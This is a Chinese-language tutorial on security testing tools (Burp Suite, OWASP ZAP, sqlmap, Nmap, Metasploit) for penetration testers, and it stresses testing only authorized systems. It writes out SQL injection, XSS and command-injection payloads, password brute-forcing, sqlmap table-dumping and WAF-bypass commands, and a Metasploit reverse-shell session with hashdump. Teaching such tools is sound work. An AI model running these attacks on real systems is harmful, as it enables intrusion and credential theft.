## 安全测试概述与分类

### 安全测试层次

```
┌─────────────────────────────┐
│   安全需求与威胁建模          │ ← STRIDE, 攻击树
├─────────────────────────────┤
│   源代码安全审计 (SAST)      │ ← SonarQube, Fortify, Checkmarx
├─────────────────────────────┤
│   软件组成分析 (SCA)         │ ← OWASP Dependency-Check, Snyk
├─────────────────────────────┤
│   动态应用安全测试 (DAST)    │ ← OWASP ZAP, Burp Suite, Acunetix
├─────────────────────────────┤
│   交互式安全测试 (IAST)      │ ← Contrast Security, Seeker
├─────────────────────────────┤
│   渗透测试                   │ ← Metasploit, Burp Suite Pro
├─────────────────────────────┤
│   安全配置审计               │ ← Nmap, Nessus, OpenVAS
└─────────────────────────────┘
```

### OWASP Top 10 (2021版)

1. **A01: Broken Access Control** - 访问控制失效
2. **A02: Cryptographic Failures** - 加密失败
3. **A03: Injection** - 注入攻击
4. **A04: Insecure Design** - 不安全的设计
5. **A05: Security Misconfiguration** - 安全配置错误
6. **A06: Vulnerable Components** - 易受攻击的组件
7. **A07: Auth Failures** - 身份认证失败
8. **A08: Software & Data Integrity Failures** - 软件和数据完整性失败
9. **A09: Security Logging & Monitoring Failures** - 安全日志和监控失败
10. **A10: SSRF** - 服务端请求伪造

## Burp Suite Web安全测试核心工具

### 2.1 概述与版本

Burp Suite 是PortSwigger开发的Web应用安全测试集成平台，是渗透测试人员最核心的工具。

| 版本 | 功能 | 价格 |
|------|------|------|
| **Community** | Proxy, Repeater, Decoder, Sequencer, Intruder(限速) | 免费 |
| **Professional** | + Scanner, Intruder(无限制), Collaborator, Extensions(BApp) | $449/年 |
| **Enterprise** | + 自动化扫描, CI/CD集成, 报表 | 按需报价 |

### 2.2 代理抓包 (Proxy)

这是Burp Suite最核心的功能模块：

**浏览器代理配置：**
```
HTTP Proxy: 127.0.0.1
Port: 8080

# 安装Burp CA证书
1. 设置浏览器代理指向127.0.0.1:8080
2. 访问 http://burpsuite
3. 下载并安装CA证书
4. 浏览器设置 → 证书管理 → 信任Burp CA证书
```

**拦截与修改请求：**
```
Proxy → Intercept → Intercept is on

# 修改请求示例
原始请求:
POST /api/login HTTP/1.1
username=user&password=pass

修改后:
POST /api/login HTTP/1.1
username=admin' OR '1'='1' -- &password=xxx

# 然后点击 Forward 转发
```

### 2.3 Repeater (请求重放)

手动修改并重新发送单个HTTP请求，用于验证漏洞：

```
用法场景：
1. 右键 → Send to Repeater
2. 在 Repeater 中修改请求参数
3. 点击 Go 发送
4. 观察响应变化

常用技巧：
# 测试SQL注入
username=admin' OR '1'='1

# 测试XSS
<script>alert(1)</script>

# 测试命令注入
; ls -la
| whoami
```

### 2.4 Intruder (暴力破解/参数模糊)

```bash
攻击类型：
1. Sniper (狙击手): 单个payload位置逐个测试
2. Battering ram (攻城锤): 多个位置同时使用同一payload
3. Pitchfork (草叉): 多个位置使用对应位置的payload列表
4. Cluster bomb (集束炸弹): 两两组合，全排列

# 实战：登录密码爆破
POST /api/login HTTP/1.1
username=admin&password=§password§

Payload类型: Simple list
Payload: 常用密码字典 (top1000-passwords.txt)

# 攻击启动后，观察响应长度差异找到正确密码
# 通常是响应长度不同于其他值
```

### 2.5 Scanner (自动扫描)

Burp Pro的自动扫描功能：

```
扫描模式：
1. Passive Scanning (被动扫描)
   - 仅分析经过Proxy的流量
   - 不发送额外请求
   - 不会修改应用

2. Active Scanning (主动扫描)
   - 发送大量探测请求
   - 可能修改数据或触发危险操作
   - 仅在测试环境使用！
```

### 2.6 Extensions (扩展生态)

**推荐BApp扩展：**
```
1. Autorize - 自动化权限测试
2. Logger++ - 增强日志记录
3. Turbo Intruder - 高性能爆破
4. ActiveScan++ - 增强主动扫描
5. Retire.js - JS库漏洞检测
6. JSON Web Tokens - JWT测试
7. Hackvertor - 编码/解码增强
```

## OWASP ZAP 开源Web安全扫描

### 3.1 概述

OWASP Zed Attack Proxy (ZAP) 是完全开源免费的Web安全扫描工具。

**安装：**
```bash
# Docker (推荐)
docker pull zaproxy/zap-stable
docker run -p 8080:8080 -i zaproxy/zap-stable zap.sh -daemon -host 0.0.0.0 -port 8080

# Linux
sudo apt install zaproxy

# macOS
brew install --cask owasp-zap

# Docker 自动化扫描
docker run --rm -v $(pwd):/zap/wrk/:rw zaproxy/zap-stable zap-full-scan.py \
  -t https://target.example.com \
  -r report.html
```

### 3.2 自动化扫描

**ZAP API 脚本驱动扫描：**
```python
# zap_scan.py
import time
import requests

ZAP_URL = "http://localhost:8080"
TARGET = "https://example.com"

# 启动爬虫
print("[*] 启动爬虫...")
requests.get(f"{ZAP_URL}/JSON/spider/action/scan/?url={TARGET}&maxChildren=10")
time.sleep(5)

# 等待爬虫完成
while True:
    status = requests.get(f"{ZAP_URL}/JSON/spider/view/status/").json()
    if status['status'] == '100':
        break
    time.sleep(2)

print("[+] 爬虫完成")

# 启动主动扫描
print("[*] 启动主动扫描...")
requests.get(f"{ZAP_URL}/JSON/ascan/action/scan/?url={TARGET}&recurse=true")
time.sleep(5)

# 等待扫描完成
while True:
    status = requests.get(f"{ZAP_URL}/JSON/ascan/view/status/").json()
    if status['status'] == '100':
        break
    time.sleep(5)

print("[+] 主动扫描完成")

# 获取告警
alerts = requests.get(f"{ZAP_URL}/JSON/core/view/alerts/?baseurl={TARGET}").json()
print(f"发现 {len(alerts.get('alerts', []))} 个潜在安全问题")

for alert in alerts.get('alerts', []):
    risk_level = alert.get('risk', 'Unknown')
    if risk_level in ['High', 'Medium']:
        print(f"  [{risk_level}] {alert.get('name')}")
        print(f"     URL: {alert.get('url')}")
        print(f"     Description: {alert.get('description')[:200]}")
```

**Jenkins 集成：**
```groovy
pipeline {
    agent any
    stages {
        stage('ZAP Security Scan') {
            steps {
                sh '''
                    docker run --rm -v $(pwd):/zap/wrk/:rw owasp/zap2docker-stable \
                      zap-full-scan.py -t https://staging.example.com \
                      -r zap_report.html \
                      -x zap_report.xml
                '''
            }
            post {
                always {
                    publishHTML(target: [
                        reportName: 'ZAP Security Report',
                        reportDir: '.',
                        reportFiles: 'zap_report.html'
                    ])
                }
            }
        }
    }
}
```

## sqlmap SQL注入检测

### 4.1 概述

sqlmap 是最强大的开源SQL注入自动化检测和利用工具。

**安装：**
```bash
# Kali Linux 预装
# 其他系统安装
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap

# 或通过 pip
pip install sqlmap
```

### 4.2 使用详解

```bash
# 1. 基础检测
sqlmap -u "https://example.com/product.php?id=1"

# 2. 指定参数
sqlmap -u "https://example.com/page.php" --data="id=1&type=product"

# 3. 从Burp请求文件导入
# 在Burp中右键 → Save item → 保存为 request.txt
sqlmap -r request.txt

# 4. 从日志文件导入
sqlmap -l burp.log --scope="example.com"

# 5. 指定数据库类型
sqlmap -u "https://example.com/page.php?id=1" --dbms=mysql

# 6. 枚举数据库
sqlmap -u "https://example.com/page.php?id=1" --dbs

# 7. 枚举表
sqlmap -u "https://example.com/page.php?id=1" -D database_name --tables

# 8. 枚举列
sqlmap -u "https://example.com/page.php?id=1" -D database_name -T users --columns

# 9. 导出数据
sqlmap -u "https://example.com/page.php?id=1" -D database_name -T users \
  -C "id,username,password" --dump

# 10. 带Cookie的请求
sqlmap -u "https://example.com/dashboard.php" \
  --cookie="PHPSESSID=abcd1234; role=admin"

# 11. 使用代理（观察流量）
sqlmap -u "https://example.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# 12. 调整风险/等级
sqlmap -u "https://example.com/page.php?id=1" --level=5 --risk=3

# --level (1-5): 测试的请求变体数量
# --risk (1-3): 测试的危险程度（3可能引发UPDATE/DELETE）

# 13. 使用随机User-Agent和延迟
sqlmap -u "https://example.com/page.php?id=1" \
  --random-agent \
  --delay=2

# 14. Tamper脚本（绕过WAF）
sqlmap -u "https://example.com/page.php?id=1" \
  --tamper=space2comment,randomcase,between
```

### 4.3 Tamper脚本

常用绕过WAF的Tamper脚本：

| Tamper | 作用 |
|--------|------|
| `space2comment` | 空格替换为 `/**/` |
| `randomcase` | 随机大小写 |
| `between` | `>` 替换为 `NOT BETWEEN 0 AND` |
| `charencode` | URL编码 |
| `charunicodeencode` | Unicode编码 |
| `equaltolike` | `=` 替换为 `LIKE` |
| `apostrophemask` | 单引号 `'` 替换为 `%EF%BC%87` |
| `versionedmorekeywords` | MySQL版本注释绕过 |

## Nmap 端口扫描

### 5.1 概述

Nmap (Network Mapper) 是网络发现和安全审计的标准工具。

**安装：**
```bash
sudo apt install nmap  # Linux
brew install nmap      # macOS
# Windows: 下载安装包 https://nmap.org/download.html
```

### 5.2 常用命令

```bash
# 主机发现
# Ping扫描（发现存活主机）
nmap -sn 192.168.1.0/24

# 跳过ping，直接扫描（防火墙可能丢弃ICMP）
nmap -Pn 192.168.1.105

# 端口扫描
# TCP SYN扫描（最常用，需要root权限）
sudo nmap -sS 192.168.1.105

# TCP Connect扫描（不需要root，但较慢）
nmap -sT 192.168.1.105

# UDP扫描
sudo nmap -sU 192.168.1.105

# 指定端口范围
nmap -p 80,443,8080-8090 192.168.1.105
nmap -p- 192.168.1.105  # 扫描全部65535个端口

# 快速扫描前1000端口
nmap -F 192.168.1.105

# 服务版本探测
nmap -sV 192.168.1.105

# 操作系统探测
sudo nmap -O 192.168.1.105

# 完整扫描
sudo nmap -sS -sV -O -p 1-65535 192.168.1.105

# 脚本扫描
nmap --script=http-headers 192.168.1.105
nmap --script=vuln 192.168.1.105  # 漏洞检测
nmap --script=ssl-enum-ciphers -p 443 192.168.1.105  # SSL/TLS检测

# 输出格式
nmap -oN normal.txt 192.168.1.105      # 标准输出
nmap -oX xml_output.xml 192.168.1.105  # XML输出
nmap -oG greppable.txt 192.168.1.105   # Grep友好格式
nmap -oA all_formats 192.168.1.105     # 输出所有格式
```

### 5.3 NSE脚本引擎

```bash
# 列出所有脚本
ls /usr/share/nmap/scripts/

# 分类使用
# http类脚本
nmap --script=http-* 192.168.1.105

# 漏洞检测
nmap --script=vuln 192.168.1.105

# 默认安全脚本
nmap --script=default 192.168.1.105

# 组合使用
nmap --script="http-*,ssl-*,vuln" 192.168.1.105
```

## Metasploit 渗透测试框架

### 6.1 概述

Metasploit Framework 是世界上最知名的渗透测试框架。

**安装：**
```bash
# Kali Linux 预装
# Ubuntu/Debian
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

# 通过Docker
docker pull metasploitframework/metasploit-framework
```

### 6.2 基础使用

```bash
# 启动控制台
msfconsole

# 搜索模块
msf6 > search type:exploit platform:windows
msf6 > search cve:2021-44228  # Log4Shell
msf6 > search eternalblue     # MS17-010
msf6 > search tomcat

# 使用模块
msf6 > use exploit/multi/http/tomcat_mgr_upload
msf6 exploit(...) > show options
msf6 exploit(...) > set RHOSTS 192.168.1.105
msf6 exploit(...) > set RPORT 8080
msf6 exploit(...) > set TARGETURI /manager
msf6 exploit(...) > set HttpUsername admin
msf6 exploit(...) > set HttpPassword admin
msf6 exploit(...) > set PAYLOAD java/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.100
msf6 exploit(...) > exploit

# 辅助模块（扫描器）
msf6 > use auxiliary/scanner/http/dir_scanner
msf6 auxiliary(...) > set RHOSTS 192.168.1.105
msf6 auxiliary(...) > set DICTIONARY /usr/share/wordlists/dirb/common.txt
msf6 auxiliary(...) > run

# Meterpreter (后渗透)
meterpreter > sysinfo
meterpreter > getuid
meterpreter > hashdump
meterpreter > screenshot
meterpreter > shell
meterpreter > background

# 数据库集成 (PostgreSQL)
msf6 > db_status
msf6 > db_nmap -sV 192.168.1.105
msf6 > hosts
msf6 > services
msf6 > vulns
```

## 5个安全测试工具使用技巧

### 技巧1: Burp Suite 高效工作流

```
标准渗透测试流程：
1. 设置浏览器代理 → Burp Suite
2. 浏览目标网站，尽可能覆盖更多功能面
3. 使用 Scope 限定目标范围 (Target → Scope)
4. 对目标进行 Spider/AJAX Spider 爬虫
5. 对感兴趣的功能点 Send to Repeater 手动测试
6. 对输入点 Send to Intruder 进行Fuzzing
7. 使用 Scanner 进行自动化扫描
8. 使用 Extensions (Autorize, Turbo Intruder) 辅助
9. 导出报告

时间分配建议：
- 信息收集：15%
- 手工测试：50%
- 自动扫描：20%
- 报告编写：15%
```

### 技巧2: sqlmap 安全使用

```bash
# === 必须遵守的原则 ===

# 1. 永远只扫描你有权限的目标
# 2. 先在测试环境验证

# 3. 使用安全参数
sqlmap -u "URL" \
  --batch \              # 非交互模式
  --threads=3 \          # 限制线程数
  --delay=2 \            # 请求间隔2秒
  --timeout=30 \         # 请求超时
  --retries=2 \          # 失败重试
  --random-agent \       # 随机UA
  --level=3 \            # 测试级别
  --risk=2 \             # 风险级别（避免用3）

# 4. 使用代理跟踪流量
sqlmap -u "URL" --proxy=http://127.0.0.1:8080

# 5. 保存所有输出
sqlmap -u "URL" --output-dir=./sqlmap_results/
```

### 技巧4: Nmap 高级扫描策略

```bash
# 分层扫描策略（平衡速度与深度）

# 第一层：快速发现
# 快速扫描常见端口，发现存活主机和服务
sudo nmap -sS -T4 -F --max-retries 1 --host-timeout 5m -oA layer1_quick

# 第二层：详细扫描
# 对发现的Web端口进行版本和脚本扫描
sudo nmap -sS -sV -T4 -p 80,443,8080,8443 \
  --script=http-headers,http-methods,ssl-enum-ciphers \
  --script-args http.useragent="Mozilla/5.0" \
  -oA layer2_web_detailed

# 第三层：漏洞扫描
sudo nmap -sS -sV -T4 -p- \
  --script=vuln,auth,default \
  -oA layer3_vuln
```

## 总结

安全测试工具的选择和使用需要遵循以下原则：

1. **合规第一** - 只测试你有权限的系统，在授权范围内操作
2. **纵深防御** - SAST + SCA + DAST + IAST 多层次覆盖
3. **自动化优先** - 将安全检查集成到CI/CD流水线
4. **持续学习** - 安全领域更新极快，持续跟进新漏洞和工具
5. **工具是辅助** - 工具不能替代安全知识，理解漏洞原理才是根本

对于大多数团队，推荐的免费/开源安全工具栈：
- **SAST:** SonarQube Community + Semgrep
- **SCA:** OWASP Dependency-Check
- **DAST:** OWASP ZAP
- **容器:** Trivy
- **密钥:** Gitleaks
